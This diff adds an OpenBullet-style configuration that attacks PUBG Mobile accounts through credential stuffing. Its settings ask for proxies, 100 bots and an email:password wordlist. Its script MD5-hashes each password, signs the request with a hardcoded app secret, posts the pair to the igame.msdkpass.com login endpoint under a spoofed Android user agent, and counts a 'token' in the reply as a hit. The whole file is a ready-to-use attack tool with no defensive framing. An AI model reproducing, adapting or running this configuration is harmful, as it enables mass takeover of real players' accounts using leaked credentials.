@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "Pubg Mobile",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-10T02:05:24.8610729+04:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#MD5 FUNCTION Hash MD5 "<PASS>" -> VAR "MD5" 
+
+#HASH FUNCTION Hash MD5 "/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\"<USER>\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"<MD5>\"}3ec8cd69d71b7922e2a17445840866b26d86e283" -> VAR "HASH" 
+
+#RNN FUNCTION RandomString "?d?d?d?d?d?d.?d?d?d" -> VAR "RNN" 
+
+#Login REQUEST POST "https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig=<HASH>" 
+  CONTENT "{\"account\":\"<USER>\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"<MD5>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.<RNN>)" 
+  HEADER "Host: igame.msdkpass.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "the account does not exists" 
+    KEY "wrong password" 
+    KEY "Params Email Format is Error" 
+    KEY "Params Email is other format" 
+  KEYCHAIN Success OR 
+    KEY "token" 
+
